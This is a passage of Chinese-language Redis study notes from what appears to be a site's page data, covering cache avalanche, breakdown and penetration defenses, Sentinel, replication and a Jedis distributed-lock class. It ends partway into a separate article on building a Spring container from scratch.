微服务中的降级、熔断\n\n\n# 击穿\n\n * 原因\n   \n   * 和缓存雪崩有点像，但又不大一样，缓存雪崩是大面积缓存失效导致的，而缓存击穿就像是一个key失效，但同时又面临着巨大的访问量，直接打到DB也挂了。 【并发量大的单个缓存失效，打崩DB】\n\n * 解决方法\n   \n   * 设置热点数据永远不过期\n   * redis分布式锁，正常查询是先查缓存，缓存没有再查数据库然后放入缓存中，\n     而我们在查缓存没有之后查数据库的时候加入redis分布式锁，锁中逻辑是这样的，也是先再查一遍缓存，缓存没有查数据库，然后再放入缓存中，最后释放锁。\n     这样当热点缓存失效时，就算你有100个请求同时访问，因为加锁了，所以其他99个请求会进入阻塞，当第一个请求访问成功后又加入了缓存中，所以其他并发请求再来的时候就不会查库嘞。\n\n\n# 穿透\n\n * 原因\n   \n   * 访问缓存和DB中都没有的数据，如id是 -1或者特别大的数据 的时候，攻击者并发高点就会使DB宕机的 【绕过缓存，打崩DB】\n\n * 解决方法\n   \n   * 从网管nignx开始配置，对同一ip每秒访问次数超过一定阈值的都拉黑\n   * 对访问参数做校验，规范key的命名，并且统一缓存查询和写入的入口。这样，在入口处，对key的规范进行检测。–这样保存恶意的key被拦截。\n   * 不管数据库中是否有数据，都在缓存中保存对应的key，值为空就行。–这样是为了避免数据库中没有这个数据，导致的平凡穿透缓存对数据库进行访问。（代码容易，但会浪费redis内存）\n   * 如果上面缓存的空值如果太多，也会导致内存耗尽。导致不必要的内存消耗。这样就要定期的清理空值的key。避免内存被恶意占满，导致正常的功能的使用。\n   * 使用布隆过滤器\n     * 创建一个布隆过滤器，我们只需要关注两个必选参数 大小和误差值 (采用hash算法可能存在误差) 这两个参数即可，至于hash算法可参考guava的布隆过滤器实现即可。查找我们订单表的所有订单编号，循环遍历加入过滤器中。\n     * 优点：布隆过滤器只有 put() 和 mightContain()，相当于一个ArrayList不能删除元素，只能添加和判断是否存在，底层用hash算法直接保存二进制位(0或1)效率高。\n     * 缺点：布隆过滤器需要手写【一般用 redis setbit(redis中set方法底层就是直接保存的二进制) 实现保证分布式高可用】，维护难，增加数据时往布隆过滤器中put()，删除元素的话需要走定时任务定时重新生成布隆过滤器。\n\n\n# redis集群\n\n我们用到了集群的部署方式也就是Redis cluster，并且是主从同步读写分离，类似Mysql的主从同步，Redis cluster 支撑 N 个 Redis master node，每个master node都可以挂载多个 slave node。\n\n主节点负责写，主从同步，从负责读\n\n这样整个 Redis 就可以横向扩容了。如果你要支撑更大数据量的缓存，那就横向扩容更多的 master 节点，每个 master 节点就能存放更多的数据了。\n\n\n# 哨兵\n\n * 功能\n   \n   * 集群监控：负责监控 Redis master 和 slave 进程是否正常工作。\n   * 消息通知：如果某个 Redis 实例有故障，那么哨兵负责发送消息作为报警通知给管理员。\n   * 故障转移：如果 master node 挂掉了，会自动转移到 slave node 上。\n   * 配置中心：如果故障转移发生了，通知 client 客户端新的 master 地址。\n\n * 原理\n   \n   * 一般最低是一主两从三哨兵，当主节点挂了时，哨兵投票选出一个（奇数个哨兵保证能选出一个）去执行故障转移\n   * 根据选主策略选出一个新的主节点，断开当前slave所有主从关系，启动时从从同步，升级为主节点，将剩余的从节点指向到新的主节点并通知客户端主节点已更换\n\n * 选主策略\n   \n   * slave 的 priority 设置的越低，优先级越高；\n   * 同等情况下，slave 复制的数据越多优先级越高；\n   * 相同的条件下 runid 越小越容易被选中。\n\n\n# 主从同步\n\n * redis同步机制\n   \n   * Redis可以使用主从同步，从从同步。\n\n 1. 启动一台slave 的时候，他会发送一个psync命令给master\n\n 2. 第一次同步时，主节点做一次bgsave，并同时将后续修改操作记录到内存buffer，待完成后将RDB文件全量同步到复制节点，复制节点接受完成后将RDB镜像加载到内存。加载完成后，再通知主节点。\n\n 3. 后续的buffer增量数据通过AOF日志同步即可，有点类似数据库的binlog\n    \n    * 1.编辑 vim /etc/redis/6379.conf\n    \n    slaveof 172.25.254.101 6379 #redis-master 的ip\n\n 4. 重启 /etc/init.d/redis_6379 restart\n\n\n# redis主从、集群、哨兵搭建\n\n * 传送门\n\n\n# 分布式锁（并发竞争、读写一致性）\n\n * 先拿setnx来争抢锁，抢到之后，再用expire给锁加一个过期时间防止锁忘记了释放。 set指令有非常复杂的参数，一般是同时把setnx和expire合成一条指令来用的！\n\n * 代码\n\n/**\n * redis分布式锁\n */\npublic class RedisLockUtil {\n \n    private static final String LOCK_SUCCESS = "OK";\n    private static final String SET_IF_NOT_EXIST = "NX";\n    private static final String SET_WITH_EXPIRE_TIME = "PX";\n \n    /**\n     * 尝试获取分布式锁\n     * @param jedis Redis客户端\n     * @param lockKey 锁\n     * @param requestId 请求标识\n     * @param expireTime 超期时间\n     * @return 是否获取成功\n       @description \n        我们加锁就一行代码：jedis.set(String key, String value, String nxxx, String expx, int time)，这个set()方法一共有五个形参：\n            第一个为key，我们使用key来当锁，因为key是唯一的。\n            第二个为value，我们传的是requestId，很多童鞋可能不明白，有key作为锁不就够了吗，为什么还要用到value？原因就是我们在上面讲到可靠性时，分布式锁要满足第四个条件解铃还须系铃人，通过给value赋值为requestId，我们就知道这把锁是哪个请求加的了，在解锁的时候就可以有依据。requestId可以使用UUID.randomUUID().toString()方法生成。\n            第三个为nxxx，这个参数我们填的是NX，意思是SET IF NOT EXIST，即当key不存在时，我们进行set操作；若key已经存在，则不做任何操作；\n            第四个为expx，这个参数我们传的是PX，意思是我们要给这个key加一个过期的设置，具体时间由第五个参数决定。\n            第五个为time，与第四个参数相呼应，代表key的过期时间。\n        总的来说，执行set()方法就只会导致两种结果：1. 当前没有锁（key不存在），那么就进行加锁操作，并对锁设置个有效期，同时value表示加锁的客户端。2. 已有锁存在，不做任何操作。\n     */\n    public static boolean tryGetDistributedLock(Jedis jedis, String lockKey, String requestId, int expireTime) {\n \n        String result = jedis.set(lockKey, requestId, SET_IF_NOT_EXIST, SET_WITH_EXPIRE_TIME, expireTime);\n \n        if (LOCK_SUCCESS.equals(result)) {\n            return true;\n        }\n        return false;\n \n    }\n\n\n\n    /**\n     * 释放分布式锁\n     * @param jedis Redis客户端\n     * @param lockKey 锁\n     * @param requestId 请求标识\n     * @return 是否释放成功\n     */\n    private static final Long RELEASE_SUCCESS = 1L;\n    public static boolean releaseDistributedLock(Jedis jedis, String lockKey, String requestId) {\n \n        String script = "if redis.call(\'get\', KEYS[1]) == ARGV[1] then return redis.call(\'del\', KEYS[1]) else return 0 end";\n        Object result = jedis.eval(script, Collections.singletonList(lockKey), Collections.singletonList(requestId));\n \n        if (RELEASE_SUCCESS.equals(result)) {\n            return true;\n        }\n        return false;\n \n    }\n\n \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n\n\n\n# 内存淘汰机制\n\n\n# redis过期策略\n\n * 定期删除\n   \n   * 定期好理解，默认100s就随机抽一些设置了过期时间的key，去检查是否过期，过期了就删了。\n     \n     * 为啥不扫描全部设置了过期时间的key呢？\n       \n       假如Redis里面所有的key都有过期时间，都扫描一遍？那太恐怖了，而且我们线上基本上也都是会设置一定的过期时间的。全扫描跟你去查数据库不带where条件不走索引全表扫描一样，100s一次，Redis累都累死了。\n\n * 惰性删除\n   \n   * 定期删除肯定删不干净。 惰性删除，见名知意，惰性嘛，我不主动删，我懒，我等你来查询了我看看你过期没，过期就删了还不给你返回，没过期该怎么样就怎么样。\n\n\n# 定期没删，我也没查询（惰性没删），那可咋整？\n\n内存淘汰机制\n\n * allkeys-lru: 尝试回收最少使用的键（LRU），使得新添加的数据有空间存放。\n * volatile-lru: 尝试回收最少使用的键（LRU），但仅限于在过期集合的键,使得新添加的数据有空间存放。\n * allkeys-random: 回收随机的键使得新添加的数据有空间存放。\n * volatile-random: 回收随机的键使得新添加的数据有空间存放，但仅限于在过期集合的键。\n\n\n# redis解决\n\n\n# 事前\n\n * redis高可用，主从+哨兵，redis cluster，避免全盘崩溃\n\n\n# 事中\n\n * Hystrix限流+降级，避免数据库炸裂\n\n\n# 事后\n\n * redis持久化，一旦重启自动恢复数据\n\n\n# 案例\n\n\n# 秒杀\n\n查看\n\n',normalizedContent:'个人看完傲丙的redis系列最后做的总结，不得不说他redis系列写的确实不错。\n\n\n\n * redis基础\n   * 使用场景\n   * 优缺点\n   * 基本数据结构\n   * 持久化\n * 缓存击穿、雪崩、穿透\n   * 雪崩\n   * 击穿\n   * 穿透\n * redis集群\n   * 哨兵\n   * 主从同步\n   * redis主从、集群、哨兵搭建\n * 分布式锁（并发竞争、读写一致性）\n * 内存淘汰机制\n   * redis过期策略\n   * 定期没删，我也没查询（惰性没删），那可咋整？\n * redis解决\n   * 事前\n   * 事中\n   * 事后\n * 案例\n   * 秒杀\n\n\n\n\n# redis基础\n\n看我之前的这篇 - 传送门\n\n\n# 使用场景\n\n * 缓存 替数据库分担压力 微博那种不断下拉分页，点赞 单点登陆 分布式锁\n\n\n# 优缺点\n\n 1. 基于内存的单线程非关系型数据库，由于在内存中完成操作，所以速度非常快，每秒十万+\n 2. 支持持久化\n 3. 高可用\n\n\n# 基本数据结构\n\n * string\n   \n   * 缓存功能：string字符串是最常用的数据类型，不仅仅是redis，各个语言都是最基本类型，因此，利用redis作为缓存，配合其它数据库作为存储层，利用redis支持高并发的特点，可以大大加快系统的读写速度、以及降低后端数据库的压力。\n   * 计数器：许多系统都会使用redis作为系统的实时计数器，可以快速实现计数和查询的功能。而且最终的数据结果可以按照特定的时间落地到数据库或者其它存储介质当中进行永久保存\n   * 共享用户session：用户重新刷新一次界面，可能需要访问一下数据进行重新登录，或者访问页面缓存cookie，但是可以利用redis将用户的session集中管理，在这种模式只需要保证redis的高可用，每次用户session的更新和获取都可以快速完成。大大提高效率。\n\n * hash\n   \n   * 这个是类似 map 的一种结构，这个一般就是可以将结构化的数据，比如一个对象（前提是这个对象没嵌套其他的对象）给缓存在 redis 里，然后每次读写缓存的时候，可以就操作 hash 里的某个字段。（用的少）\n\n * list\n   \n   * 比如可以通过 list 存储一些列表型的数据结构，类似粉丝列表、文章的评论列表之类的东西。\n     \n     * lpush key v1 v2 v3 在key中依次插入3个值,每次插入都放在最左边\n     * lrange key start(起始下标) stop(结束下标) 取出key中从下标start到stop(包含)的值\n     * lrange list (当前页-1)rows pagerows-1 分页\n\n * set\n   \n   * 基于 set 玩儿交集、并集、差集的操作，比如交集吧，我们可以把两个人的好友列表整一个交集，看看俩人的共同好友是谁？对吧。\n\n * sortedset\n   \n   * 去重且排序\n     \n     * 排行榜：有序集合经典使用场景。例如视频网站需要对用户上传的视频做排行榜，榜单维护可能是多方面：按照时间、按照播放量、按照获得的赞数等。\n     * 用sorted sets来做带权重的队列，比如普通消息的score为1，重要消息的score为2，然后工作线程可以选择按score的倒序来获取工作任务。让重要的任务优先执行。\n\n\n# 持久化\n\n * rdb做镜像全量持久化，aof做增量持久化。 因为rdb会耗费较长时间，不够实时，在停机的时候会导致大量丢失数据，所以需要aof来配合使用。在redis实例重启时，会使用rdb持久化文件重新构建内存，再使用aof重放近期的操作指令来实现完整恢复重启之前的状态。\n   \n   * rdb\n     \n     * fork和cow：fork是指redis通过创建子进程来进行rdb操作，采用二进制压缩存储。cow指的是copy on write，子进程创建后，父子进程共享数据段，父进程继续提供读写服务，写脏的页面数据会逐渐和子进程分离开来。\n     * 因为是子进程完成的，所以效率高一点，但是生成一次rdb快照文件需要花费的时间较长。\n   \n   * aof\n     \n     * 效率稍慢，类似于我们用java流写数据时往文件上不断追加redis操作命令，aof的执行时间通过配置redis来实现，一般是1秒\n     * 效率稍慢，rdb五分钟一次生成快照，但是aof是一秒一次去通过一个后台的线程fsync操作，那最多丢这一秒的数据。\n\n * 不过redis本身的机制是 aof持久化开启且存在aof文件时，优先加载aof文件；aof关闭或者aof文件不存在时，加载rdb文件；加载aof/rdb文件城后，redis启动成功；aof/rdb文件存在错误时，redis启动失败并打印错误信息。\n\n\n# 缓存击穿、雪崩、穿透\n\n\n# 雪崩\n\n * 原因\n   \n   * 如果大量的key过期时间设置的过于集中，到过期的那个时间点，缓存失效，同时又有巨大访问量，没有缓存直接到db肯定扛不住，这不就炸了吗，这就是缓存雪崩导致的 【大面积的缓存失效，打崩了db】\n\n * 场景\n   \n   * 目前电商首页以及热点数据经常会使用定时任务刷新缓存，可能大量的数据失效时间都十分集中，如果失效时间一样，又刚好在失效的时间点大量用户涌入，就有可能造成缓存雪崩\n\n * 解决方法\n   \n   * 1. 我们一般在过期时间上加一个随机值，使得过期时间分散一些（推荐）\n     * setredis（key，value，time + math.random() * 10000）；\n   * 2. 如果redis是集群部署，将热点数据均匀分布在不同的redis库中也能避免全部失效的问题，\n   * 3. 或者设置热点数据永远不过期，有更新操作就更新缓存就好了（比如运维更新了首页商品，那你刷下缓存就完事了，不要设置过期时间），电商首页的数据也可以用这个操作，保险。\n   * 4. 微服务中的降级、熔断\n\n\n# 击穿\n\n * 原因\n   \n   * 和缓存雪崩有点像，但又不大一样，缓存雪崩是大面积缓存失效导致的，而缓存击穿就像是一个key失效，但同时又面临着巨大的访问量，直接打到db也挂了。 【并发量大的单个缓存失效，打崩db】\n\n * 解决方法\n   \n   * 设置热点数据永远不过期\n   * redis分布式锁，正常查询是先查缓存，缓存没有再查数据库然后放入缓存中，\n     而我们在查缓存没有之后查数据库的时候加入redis分布式锁，锁中逻辑是这样的，也是先再查一遍缓存，缓存没有查数据库，然后再放入缓存中，最后释放锁。\n     这样当热点缓存失效时，就算你有100个请求同时访问，因为加锁了，所以其他99个请求会进入阻塞，当第一个请求访问成功后又加入了缓存中，所以其他并发请求再来的时候就不会查库嘞。\n\n\n# 穿透\n\n * 原因\n   \n   * 访问缓存和db中都没有的数据，如id是 -1或者特别大的数据 的时候，攻击者并发高点就会使db宕机的 【绕过缓存，打崩db】\n\n * 解决方法\n   \n   * 从网管nignx开始配置，对同一ip每秒访问次数超过一定阈值的都拉黑\n   * 对访问参数做校验，规范key的命名，并且统一缓存查询和写入的入口。这样，在入口处，对key的规范进行检测。–这样保存恶意的key被拦截。\n   * 不管数据库中是否有数据，都在缓存中保存对应的key，值为空就行。–这样是为了避免数据库中没有这个数据，导致的平凡穿透缓存对数据库进行访问。（代码容易，但会浪费redis内存）\n   * 如果上面缓存的空值如果太多，也会导致内存耗尽。导致不必要的内存消耗。这样就要定期的清理空值的key。避免内存被恶意占满，导致正常的功能的使用。\n   * 使用布隆过滤器\n     * 创建一个布隆过滤器，我们只需要关注两个必选参数 大小和误差值 (采用hash算法可能存在误差) 这两个参数即可，至于hash算法可参考guava的布隆过滤器实现即可。查找我们订单表的所有订单编号，循环遍历加入过滤器中。\n     * 优点：布隆过滤器只有 put() 和 mightcontain()，相当于一个arraylist不能删除元素，只能添加和判断是否存在，底层用hash算法直接保存二进制位(0或1)效率高。\n     * 缺点：布隆过滤器需要手写【一般用 redis setbit(redis中set方法底层就是直接保存的二进制) 实现保证分布式高可用】，维护难，增加数据时往布隆过滤器中put()，删除元素的话需要走定时任务定时重新生成布隆过滤器。\n\n\n# redis集群\n\n我们用到了集群的部署方式也就是redis cluster，并且是主从同步读写分离，类似mysql的主从同步，redis cluster 支撑 n 个 redis master node，每个master node都可以挂载多个 slave node。\n\n主节点负责写，主从同步，从负责读\n\n这样整个 redis 就可以横向扩容了。如果你要支撑更大数据量的缓存，那就横向扩容更多的 master 节点，每个 master 节点就能存放更多的数据了。\n\n\n# 哨兵\n\n * 功能\n   \n   * 集群监控：负责监控 redis master 和 slave 进程是否正常工作。\n   * 消息通知：如果某个 redis 实例有故障，那么哨兵负责发送消息作为报警通知给管理员。\n   * 故障转移：如果 master node 挂掉了，会自动转移到 slave node 上。\n   * 配置中心：如果故障转移发生了，通知 client 客户端新的 master 地址。\n\n * 原理\n   \n   * 一般最低是一主两从三哨兵，当主节点挂了时，哨兵投票选出一个（奇数个哨兵保证能选出一个）去执行故障转移\n   * 根据选主策略选出一个新的主节点，断开当前slave所有主从关系，启动时从从同步，升级为主节点，将剩余的从节点指向到新的主节点并通知客户端主节点已更换\n\n * 选主策略\n   \n   * slave 的 priority 设置的越低，优先级越高；\n   * 同等情况下，slave 复制的数据越多优先级越高；\n   * 相同的条件下 runid 越小越容易被选中。\n\n\n# 主从同步\n\n * redis同步机制\n   \n   * redis可以使用主从同步，从从同步。\n\n 1. 启动一台slave 的时候，他会发送一个psync命令给master\n\n 2. 第一次同步时，主节点做一次bgsave，并同时将后续修改操作记录到内存buffer，待完成后将rdb文件全量同步到复制节点，复制节点接受完成后将rdb镜像加载到内存。加载完成后，再通知主节点。\n\n 3. 后续的buffer增量数据通过aof日志同步即可，有点类似数据库的binlog\n    \n    * 1.编辑 vim /etc/redis/6379.conf\n    \n    slaveof 172.25.254.101 6379 #redis-master 的ip\n\n 4. 重启 /etc/init.d/redis_6379 restart\n\n\n# redis主从、集群、哨兵搭建\n\n * 传送门\n\n\n# 分布式锁（并发竞争、读写一致性）\n\n * 先拿setnx来争抢锁，抢到之后，再用expire给锁加一个过期时间防止锁忘记了释放。 set指令有非常复杂的参数，一般是同时把setnx和expire合成一条指令来用的！\n\n * 代码\n\n/**\n * redis分布式锁\n */\npublic class redislockutil {\n \n    private static final string lock_success = "ok";\n    private static final string set_if_not_exist = "nx";\n    private static final string set_with_expire_time = "px";\n \n    /**\n     * 尝试获取分布式锁\n     * @param jedis redis客户端\n     * @param lockkey 锁\n     * @param requestid 请求标识\n     * @param expiretime 超期时间\n     * @return 是否获取成功\n       @description \n        我们加锁就一行代码：jedis.set(string key, string value, string nxxx, string expx, int time)，这个set()方法一共有五个形参：\n            第一个为key，我们使用key来当锁，因为key是唯一的。\n            第二个为value，我们传的是requestid，很多童鞋可能不明白，有key作为锁不就够了吗，为什么还要用到value？原因就是我们在上面讲到可靠性时，分布式锁要满足第四个条件解铃还须系铃人，通过给value赋值为requestid，我们就知道这把锁是哪个请求加的了，在解锁的时候就可以有依据。requestid可以使用uuid.randomuuid().tostring()方法生成。\n            第三个为nxxx，这个参数我们填的是nx，意思是set if not exist，即当key不存在时，我们进行set操作；若key已经存在，则不做任何操作；\n            第四个为expx，这个参数我们传的是px，意思是我们要给这个key加一个过期的设置，具体时间由第五个参数决定。\n            第五个为time，与第四个参数相呼应，代表key的过期时间。\n        总的来说，执行set()方法就只会导致两种结果：1. 当前没有锁（key不存在），那么就进行加锁操作，并对锁设置个有效期，同时value表示加锁的客户端。2. 已有锁存在，不做任何操作。\n     */\n    public static boolean trygetdistributedlock(jedis jedis, string lockkey, string requestid, int expiretime) {\n \n        string result = jedis.set(lockkey, requestid, set_if_not_exist, set_with_expire_time, expiretime);\n \n        if (lock_success.equals(result)) {\n            return true;\n        }\n        return false;\n \n    }\n\n\n\n    /**\n     * 释放分布式锁\n     * @param jedis redis客户端\n     * @param lockkey 锁\n     * @param requestid 请求标识\n     * @return 是否释放成功\n     */\n    private static final long release_success = 1l;\n    public static boolean releasedistributedlock(jedis jedis, string lockkey, string requestid) {\n \n        string script = "if redis.call(\'get\', keys[1]) == argv[1] then return redis.call(\'del\', keys[1]) else return 0 end";\n        object result = jedis.eval(script, collections.singletonlist(lockkey), collections.singletonlist(requestid));\n \n        if (release_success.equals(result)) {\n            return true;\n        }\n        return false;\n \n    }\n\n \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n\n\n\n# 内存淘汰机制\n\n\n# redis过期策略\n\n * 定期删除\n   \n   * 定期好理解，默认100s就随机抽一些设置了过期时间的key，去检查是否过期，过期了就删了。\n     \n     * 为啥不扫描全部设置了过期时间的key呢？\n       \n       假如redis里面所有的key都有过期时间，都扫描一遍？那太恐怖了，而且我们线上基本上也都是会设置一定的过期时间的。全扫描跟你去查数据库不带where条件不走索引全表扫描一样，100s一次，redis累都累死了。\n\n * 惰性删除\n   \n   * 定期删除肯定删不干净。 惰性删除，见名知意，惰性嘛，我不主动删，我懒，我等你来查询了我看看你过期没，过期就删了还不给你返回，没过期该怎么样就怎么样。\n\n\n# 定期没删，我也没查询（惰性没删），那可咋整？\n\n内存淘汰机制\n\n * allkeys-lru: 尝试回收最少使用的键（lru），使得新添加的数据有空间存放。\n * volatile-lru: 尝试回收最少使用的键（lru），但仅限于在过期集合的键,使得新添加的数据有空间存放。\n * allkeys-random: 回收随机的键使得新添加的数据有空间存放。\n * volatile-random: 回收随机的键使得新添加的数据有空间存放，但仅限于在过期集合的键。\n\n\n# redis解决\n\n\n# 事前\n\n * redis高可用，主从+哨兵，redis cluster，避免全盘崩溃\n\n\n# 事中\n\n * hystrix限流+降级，避免数据库炸裂\n\n\n# 事后\n\n * redis持久化，一旦重启自动恢复数据\n\n\n# 案例\n\n\n# 秒杀\n\n查看\n\n',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"手写 Spring 01 - 核心容器实现",frontmatter:{title:"手写 Spring 01 - 核心容器实现",date:"2023-02-17T00:00:00.000Z",tags:["源码分析","Java"],categories:["后端 Back-end"],isShowComments:!0},regularPath:"/views/backend/spring-source-01.html",relativePath:"views/backend/spring-source-01.md",key:"v-bc82a4bc",path:"/views/backend/spring-source-01.html",headers:[{level:2,title:"核心容器 DefaultListableBeanFactory",slug:"核心容器-defaultlistablebeanfactory",normalizedTitle:"核心容器 defaultlistablebeanfactory",charIndex:176},{level:3,title:"定义一些职责和能力：",slug:"定义一些职责和能力",normalizedTitle:"定义一些职责和能力：",charIndex:213},{level:3,title:"具体的实现：",slug:"具体的实现",normalizedTitle:"具体的实现：",charIndex:229},{level:3,title:"将实现加入原有的逻辑中：",slug:"将实现加入原有的逻辑中",normalizedTitle:"将实现加入原有的逻辑中：",charIndex:241},{level:3,title:"测试：",slug:"测试",normalizedTitle:"测试：",charIndex:259},{level:2,title:"实例化",slug:"实例化",normalizedTitle:"实例化",charIndex:80},{level:3,title:"定义一些职责和能力：",slug:"定义一些职责和能力-2",normalizedTitle:"定义一些职责和能力：",charIndex:213},{level:3,title:"具体的实现：",slug:"具体的实现-2",normalizedTitle:"具体的实现：",charIndex:229},{level:3,title:"将实现加入原有的逻辑中：",slug:"将实现加入原有的逻辑中-2",normalizedTitle:"将实现加入原有的逻辑中：",charIndex:241},{level:3,title:"测试：",slug:"测试-2",normalizedTitle:"测试：",charIndex:259},{level:2,title:"属性填充",slug:"属性填充",normalizedTitle:"属性填充",charIndex:328},{level:3,title:"定义一些职责和能力：",slug:"定义一些职责和能力-3",normalizedTitle:"定义一些职责和能力：",charIndex:213},{level:3,title:"具体的实现：",slug:"具体的实现-3",normalizedTitle:"具体的实现：",charIndex:229},{level:3,title:"将实现加入原有的逻辑中：",slug:"将实现加入原有的逻辑中-3",normalizedTitle:"将实现加入原有的逻辑中：",charIndex:241},{level:3,title:"测试：",slug:"测试-3",normalizedTitle:"测试：",charIndex:259}],excerpt:"<Boxx/>\n<p>Spring 的核心容器由两个部分组成：BeanFactory 和 ApplicationContext。BeanFactory 是 Spring 的基础，负责实例化、配置和管理应用程序中的对象。ApplicationContext 是 BeanFactory 的一个更高级别的实现，提供了额外的功能，如国际化、事件传播和Bean预处理。</p>\n",headersStr:"核心容器 DefaultListableBeanFactory 定义一些职责和能力： 具体的实现： 将实现加入原有的逻辑中： 测试： 实例化 定义一些职责和能力： 具体的实现： 将实现加入原有的逻辑中： 测试： 属性填充 定义一些职责和能力： 具体的实现： 将实现加入原有的逻辑中： 测试：",content:'Spring 的核心容器由两个部分组成：BeanFactory 和 ApplicationContext。BeanFactory 是 Spring 的基础，负责实例化、配置和管理应用程序中的对象。ApplicationContext 是 BeanFactory 的一个更高级别的实现，提供了额外的功能，如国际化、事件传播和Bean预处理。\n\n\n\n * 核心容器 DefaultListableBeanFactory\n   * 定义一些职责和能力：\n   * 具体的实现：\n   * 将实现加入原有的逻辑中：\n   * 测试：\n * 实例化\n   * 定义一些职责和能力：\n   * 具体的实现：\n   * 将实现加入原有的逻辑中：\n   * 测试：\n * 属性填充\n   * 定义一些职责和能力：\n   * 具体的实现：\n   * 将实现加入原有的逻辑中：\n   * 测试：\n\n\n\n设计一个Spring容器需要考虑以下几个方面：\n\n 1. 容器初始化\n\nSpring 容器初始化过程中需要完成的任务包括：读取 XML 配置文件，解析 XML 配置信息，创建 Bean 对象，进行 Bean 之间的依赖注入等。因此，设计一个高效的初始化过程是非常重要的。可以考虑采用单例模式，使用懒加载机制来避免无用的资源浪费。\n\n 2. Bean 的实例化和管理\n\n在设计 Spring 容器时，需要考虑如何管理 Bean 的生命周期，包括 Bean 的实例化、初始化、销毁等。可以使用反射机制来实例化 Bean，使用依赖注入技术来完成 Bean 之间的依赖关系。对于 Bean 的生命周期管理，可以使用 BeanPostProcessor 和 BeanFactoryPostProcessor 等机制。\n\n 3. 依赖注入\n\n依赖注入是 Spring 的核心功能之一，它使得 Bean 之间的关系更加松散。设计一个高效的依赖注入机制是非常重要的。可以考虑使用自动装配机制，根据 Bean 之间的依赖关系自动完成依赖注入。同时，为了避免循环依赖问题，可以使用构造函数注入或者延迟依赖注入等机制。\n\n 4. AOP\n\n面向切面编程（AOP）是Spring的另一个核心功能。在设计 Spring 容器时，需要考虑如何支持 AOP。可以使用代理模式或者字节码增强技术来实现 AOP 功能。同时，为了方便用户使用，可以提供注解或者 XML 配置文件等方式来配置 AOP。\n\n 5. Web 支持\n\nSpring 也提供了 Web 支持，包括 MVC 架构和 RESTful 服务等。在设计 Spring 容器时，需要考虑如何支持 Web 功能。可以使用 Servlet 容器来支持 Web 功能，并提供注解或者 XML 配置文件等方式来配置 Web 功能。\n\n总的来说，设计一个高效、易用、灵活的 Spring 容器需要考虑多个方面，包括容器初始化、Bean 的实例化和管理、依赖注入、AOP 和 Web 支持等。需要根据具体需求来确定设计方案，并不断优化和改进。\n\n\n# 核心容器 DefaultListableBeanFactory\n\n对 Spring 中的核心类：DefaultListableBeanFactory 做一个简单初步的实现：\n\n\n# 定义一些职责和能力：\n\n 1. BeanFactory：提供获取 Bean 的能力；\n\n 2. BeanDefinition：Spring 可以通过 xml 或 注解 的方式加载一个 Bean，但为了更好的扩展，不管从何处加载的 Bean， 最好都统一转换为一个指定对象， 那么就需要定义一个统一的门面对象：BeanDefinition，只要有 BeanDefinition 我们就可以实例化一个 Bean；\n\n 3. SingletonBeanRegistry：提供获取一个 单例Bean 的能力（其实就是通过每个BeanDefinition定义的Class反射获得一个Bean，并缓存起来）；\n\n 4. BeanDefinitionRegistry：提供注册 BeanDefinition 的能力；\n\n\n# 具体的实现：\n\n 1. DefaultSingletonBeanRegistry： implements SingletonBeanRegistry， 实现了 单例Bean 的添加，获取；\n\n 2. AbstractBeanFactory：extends DefaultSingletonBeanRegistry implements BeanFactory， 实现了 getBean(String beanName) 而 getBean(String beanName) 的实现则主要是调用留给子类实现的空方法 createBean(beanName, beanDefinition)；\n\n 3. AbstractAutowireCapableBeanFactory：extends AbstractBeanFactory，实现createBean(beanName, beanDefinition)， 实现通过 BeanDefinition 创建 Bean 的能力；\n\n 4. ★ DefaultListableBeanFactory：extends AbstractAutowireCapableBeanFactory implements BeanDefinitionRegistry， 实现注册 BeanDefinition 的能力，获得一个 Bean 的能力；\n\n\n# 将实现加入原有的逻辑中：\n\n * 无\n\n\n# 测试：\n\npublic void testDefaultListableBeanFactory(){\n   // DefaultListableBeanFactory 的用法\n   DefaultListableBeanFactory beanFactory=new DefaultListableBeanFactory();\n   // 1. 注册Bean的能力：将一个普通对象转换为 BeanDefinition，并注册进容器中\n   BeanDefinition beanDefinition=new BeanDefinition(Cat.class);\n   beanFactory.registerBeanDefinition("cat",beanDefinition);\n   // 2. 获取Bean的能力：从容器中获取指定 Bean，第一次获取会示例化并缓存\n   Cat cat=(Cat)beanFactory.getBean("cat");\n   cat.name();\n   // 3. 第二次会直接从单例缓存中获取\n   Cat cat_cache=(Cat)beanFactory.getBean("cat");\n   cat_cache.name();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 实例化\n\n上述方式只支持默认的无参构造实例化 Bean。\n\n\n# 定义一些职责和能力：\n\n 1. InstantiationStrategy：要想容器支持对 Bean的有参构造器 实例化的方式，需要定义一个实例化策略接口 InstantiationStrategy，当然，定义这个 InstantiationStrategy 策略接口也是为了支持不同实例化方式方便扩展。\n\n添加一个实例化方法：Object instantiatie(BeanDefinition beanDefinition, String beanName, Constructor constructor, Object[] args);\n\n一个 Bean 的实例化，需要的基本参数有：\n\n * BeanDefinition：主要保存了一个具体类的定义，主要就是实例化这个类\n * Constructor：通过哪个构造方法实例化\n * args：构造方法的参数\n\n\n# 具体的实现：\n\n * SimpleInstantiationStrategy：JDK 实例化策略\n\n * CglibSubclassingInstantiationStrategy：cglib 实例化策略\n\n\n# 将实现加入原有的逻辑中：\n\n 1. AbstractAutowireCapableBeanFactory：修改 createBean(String beanName, BeanDefinition beanDefinition) 实现，加入支持有参构造的实例化策略 createBeanInstance(beanDefinition, beanName, args);。\n\n\n# 测试：\n\n@Test\npublic void testDefaultListableBeanFactoryGetBeanWithConstructor(){\n   // DefaultListableBeanFactory 的用法\n   DefaultListableBeanFactory beanFactory=new DefaultListableBeanFactory();\n   // 1. 注册Bean的能力：将一个普通对象转换为 